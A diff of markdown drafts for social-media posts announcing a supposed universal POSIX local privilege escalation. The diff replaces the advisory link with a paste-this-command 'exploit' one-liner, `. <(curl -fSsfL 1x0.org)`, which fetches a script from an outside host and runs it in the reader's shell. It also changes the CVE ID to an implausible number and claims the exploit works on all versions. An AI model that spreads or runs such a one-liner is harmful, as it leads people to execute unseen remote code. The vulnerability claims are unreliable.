@@ -2,12 +2,9 @@
 
 ## Single post
 
-> CVE-2026-73501: local root on every *nix.
+> 💥CVE-2026-73737373 (7350pipe#reborn) - Linux Privilege Escalation (all versions). Exploit (1-liner):
 >
-> POSIX tty session desync. No setuid binary, no memory corruption, no
-> password. 9.8 CVSS, public PoC.
->
-> Advisory + exploit: https://1x0.org
+> `. <(curl -fSsfL 1x0.org)`
 >
 > #infosec #cve #linux #unix
 
@@ -17,8 +14,8 @@
 
 **1/6**
 
-> CVE-2026-73501 — local privilege escalation on every POSIX system with a
-> controlling terminal.
+> CVE-2026-73737373 (7350pipe#reborn) — local privilege escalation on every
+> POSIX system with a controlling terminal.
 >
 > Linux, the BSDs, macOS, Solaris/illumos, AIX.
 >
@@ -64,7 +61,7 @@
 
 ## Alt text for the demo GIF
 
-> A terminal recording. The PoC announces CVE-2026-73501, probes the terminal
+> A terminal recording. The PoC announces CVE-2026-73737373, probes the terminal
 > line discipline, confirms the credential snapshot, and returns an interactive
 > shell. `id` reports `uid=0(root)`. `whoami` reports `root`.
 
